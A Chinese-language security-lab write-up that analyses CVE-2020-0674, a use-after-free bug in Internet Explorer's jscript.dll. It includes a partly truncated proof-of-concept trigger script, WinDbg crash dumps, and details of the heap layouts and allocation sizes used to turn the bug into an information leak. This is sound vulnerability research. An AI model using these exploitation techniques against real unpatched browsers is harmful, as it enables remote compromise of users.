银雁冰@猎影实验室
0x01 前言  
CVE-2020-0674是360和Google在2020年初抓到的一个IE
0day，它是一个位于jscript.dll模块的UAF(释放后重用)漏洞。最近，该漏洞的一份完整利用代码在github被公布，猎影实验室对此进行了分析。  
0x02 漏洞成因  
该漏洞的成因为：若Array.sort()被调用时传入一个比较函数，jscript内部没有将此比较函数的两个参数加入GC，导致可以在对象被释放后得到悬垂指针。笔者去年曾分析过一个此类漏洞，当时就预测此类漏洞后面还会出现。  
我们一起来看一下这个漏洞的PoC：
    var depth = 0; 
    var spray_size = 10000; 
    var spray = new Array(); 
    var sort = new Array(); 
    var total = new Array(); 
    for(i = 0; i  50) { 
            spray = new Array(); 
            CollectGarbage(); 
            total.push(untracked_1); 
            total.push(untracked_2); 
            return 0; 
        } 
        depth += 1; 
        sort[depth].sort(uaf); 
        return 0; 
    } 
    sort[depth].sort(uaf);  
    for(i = 0; i 
笔者所用分析环境如下：  
Windows 7 sp1 64位 + IE 11(jscript.dll 5.8.9600.17840 64位)  
为IE开启页堆，在调试器中打开上述PoC，可以观察到如下崩溃：
    (3a8.c60): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    jscript!CScriptRuntime::TypeOf+0x30:
    000007fe`f06c1e28 0fb717          movzx   edx,word ptr [rdi] ds:00000000`047f5d30=????
    0:012> ub @rip
    jscript!CScriptRuntime::TypeOf+0x12:
    000007fe`f06c1e0a 4157            push    r15
    000007fe`f06c1e0c 488bec          mov     rbp,rsp
    000007fe`f06c1e0f 4883ec50        sub     rsp,50h
    000007fe`f06c1e13 488bb990000000  mov     rdi,qword ptr [rcx+90h]
    000007fe`f06c1e1a 4533f6          xor     r14d,r14d
    000007fe`f06c1e1d 488bf1          mov     rsi,rcx
    000007fe`f06c1e20 418d5e02        lea     ebx,[r14+2]
    000007fe`f06c1e24 448d7b7e        lea     r15d,[rbx+7Eh]
    0:012> u @rip
    jscript!CScriptRuntime::TypeOf+0x30:
    000007fe`f06c1e28 0fb717          movzx   edx,word ptr [rdi] ;显然，这里在取VARIANT的Type
    000007fe`f06c1e2b 81fa81000000    cmp     edx,81h ;判断VARIANT的Type是否为Object
    000007fe`f06c1e31 7e66            jle     jscript!CScriptRuntime::TypeOf+0xa1 (000007fe`f06c1e99)
    000007fe`f06c1e33 81fa83000000    cmp     edx,83h
    000007fe`f06c1e39 0f85c9000000    jne     jscript!CScriptRuntime::TypeOf+0x110 (000007fe`f06c1f08)
    000007fe`f06c1e3f 488b16          mov     rdx,qword ptr [rsi]
    000007fe`f06c1e42 4c8d4de0        lea     r9,[rbp-20h]
    000007fe`f06c1e46 448bc3          mov     r8d,ebx
    0:012> k
    Child-SP          RetAddr           Call Site
    00000000`11bba7c0 000007fe`f06c1ddb jscript!CScriptRuntime::TypeOf+0x30
    00000000`11bba830 000007fe`f0698ec2 jscript!CScriptRuntime::Run+0x3c88
    00000000`11bbb630 000007fe`f0698d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
    00000000`11bbb840 000007fe`f0698b95 jscript!ScrFncObj::Call+0xb7
    00000000`11bbb8e0 000007fe`f069e640 jscript!CSession::Execute+0x19e
    00000000`11bbb9b0 000007fe`f06a70e7 jscript!COleScript::ExecutePendingScripts+0x17a
    00000000`11bbba80 000007fe`f06a68e6 jscript!COleScript::ParseScriptTextCore+0x267
    00000000`11bbbb70 000007fe`ec4a9d41 jscript!COleScript::ParseScriptText+0x56
    00000000`11bbbbd0 000007fe`ec4a97e2 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
    00000000`11bbbc50 000007fe`ec4aa8e5 MSHTML!CScriptCollection::ParseScriptText+0x27a
    00000000`11bbbd30 000007fe`ec4aa457 MSHTML!CScriptData::CommitCode+0x395
    00000000`11bbbf00 000007fe`ec4aa1ed MSHTML!CScriptData::Execute+0x24b
    00000000`11bbbfc0 000007fe`ec22dc19 MSHTML!CHtmScriptParseCtx::Execute+0xe9
    00000000`11bbbff0 000007fe`ec831419 MSHTML!CHtmParseBase::Execute+0x1dd
    00000000`11bbc0e0 000007fe`ec35114f MSHTML!CHtmPost::Exec+0x555
    00000000`11bbc2f0 000007fe`ec351098 MSHTML!CHtmPost::Run+0x3f
    00000000`11bbc320 000007fe`ec352387 MSHTML!PostManExecute+0x70
    00000000`11bbc3a0 000007fe`ec354ea3 MSHTML!PostManResume+0xa1
    00000000`11bbc3e0 000007fe`ec212dc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43
    00000000`11bbc430 000007fe`ecad481e MSHTML!CDwnChan::OnMethodCall+0x41
    00000000`11bbc460 000007fe`ec15bdd8 MSHTML!GlobalWndOnMethodCall+0x219
    00000000`11bbc500 00000000`76ab9bd1 MSHTML!GlobalWndProc+0x24c
    00000000`11bbc580 00000000`76ab98da USER32!UserCallWinProcCheckWow+0x1ad
    00000000`11bbc640 000007fe`f10eee57 USER32!DispatchMessageWorker+0x3b5
    00000000`11bbc6c0 000007fe`f10f1d8b IEFRAME!CTabWindow::_TabWindowThreadProc+0x64c
    00000000`11bbf940 000007fe`fd4cfbaf IEFRAME!LCIETab_ThreadProc+0x3a3
    00000000`11bbfa70 000007fe`f38961af iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
    00000000`11bbfaa0 00000000`76bb652d IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
    00000000`11bbfaf0 00000000`76cec541 kernel32!BaseThreadInitThunk+0xd
    00000000`11bbfb20 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
很明显，崩溃的原因是jscript!CScriptRuntime::TypeOf在解引用一个VARIANT指针时，发现该VARIANT已经被释放，属于典型的UAF。  
下面跟随笔者一起来调试一下利用代码。  
0x03 从UAF到信息泄露  
代码中首先通过这个UAF漏洞来泄露一个指针，相关原理笔者已经在CVE-2018-8353那篇文章中进行描述，唯一不同的是本次涉及的是64位下的偏移和对象。  
前置知识A  
要理解这里的释放后重用，首先要了解相关对象。  
首先，当new Object()时，jscript会在内存中申请一个VARIANT，64位下每个VARIANT所占内存为0x18字节，结构如下：
    // 64位 JScript VARIANT (0x18 bytes)
      +0x00 Type   // (WORD)
      +0x08 Value  // (QWORD) an immediate value or a pointer 
      +0x10 Unused // (QWORD) Unused for most types
这些VARIANT设计上属于GC对象，所以会申请在一个大的GcBlock中，GcBlock结构如下：  
// 64位 JScript GcBlock (0x970 bytes)
    struct GcBlock { 
        struct GcBlock * prev; 
        struct GcBlock * next; 
        VARIANTIANT mem[100]; 
    };
64位下每个GcBlock大小为0x970，可以由如下公式计算得出：  
sizeof(GcBlock) = 0x08 + 0x08 + 0x18*0n100 = 0x970  
这些Object VARIANT在内存中排列如下：
    0:022> !heap -p -a 892b6d0 
        address 000000000892b6d0 found in 
        _HEAP @ 2f0000 
                  HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state 
            000000000892b6c0 0099 0000  [00]   000000000892b6d0    00970 - (busy) 
    // 最开始0x10字节为prev与next指针，随后100个大小为0x18的VARIANT交替排列 
    0:022> dc 892b6d0 
    00000000`0892b6d0  0892ad40 00000000 0892c060 00000000  @.......`....... 
    00000000`0892b6e0  00000081 00000000 08914130 00000000  ........0A...... 
    00000000`0892b6f0  0892b6f8 00000000 00000081 00000000  ................ 
    00000000`0892b700  089140c0 00000000 0892b710 00000000  .@.............. 
    00000000`0892b710  00000081 00000000 08914050 00000000  ........P@...... 
    00000000`0892b720  0892b728 00000000 00000081 00000000  (............... 
    00000000`0892b730  08913fe0 00000000 0892b740 00000000  .?......@....... 
    00000000`0892b740  00000081 00000000 08913f70 00000000  ........p?...... 
    ...
上面的VARIANT对象在GcBlock中的布局可能不太直观，笔者其进行着色如下：
利用此类UAF漏洞的思路是申请大量VARIANT对象，然后进行释放，这样就会得到一个个空闲的大小为0x970左右的堆块，这些堆块会被回收到低碎片堆中，接着迅速重用这些堆块。  
那么，如何重用这些空闲堆块呢？  
前置知识B  
这里再补充一些前置知识，在为一个jscript对象添加第一个成员变量时，若成员变量的长度超过一定阈值，jscript会调用NameList::FCreateVval去申请特定大小的内存，64位下，具体的申请操作在NoRelAlloc::PvAlloc中完成，这里直接将计算公式概括如下(具体细节读者可以自行逆向上述两个函数)：  
alloc_size = (2x + 0x42) * 2 + 8 // x为Object的属性长度，按字符数计算  
当alloc_size为0x970时，我们就可以重用之前回收的GcBlock内存块。此时对应的x=569。  
重用后的内存内排列着一个个代表属性的结构与属性名称，具体结构定义如下：
    // Property(size = 0x40) win7 64 bit 
      +0x00 var         // (sizeof(VARIANT)) 当前属性值 
      +0x18 ?           // (QWORD) 
      +0x20 hash        // (DWORD)  
      +0x24 name_length // (DWORD) 当前属性名长度 
      +0x28 next        // (QWORD) 下一个Property结构体地址 
      +0x30 ?           // (QWORD) 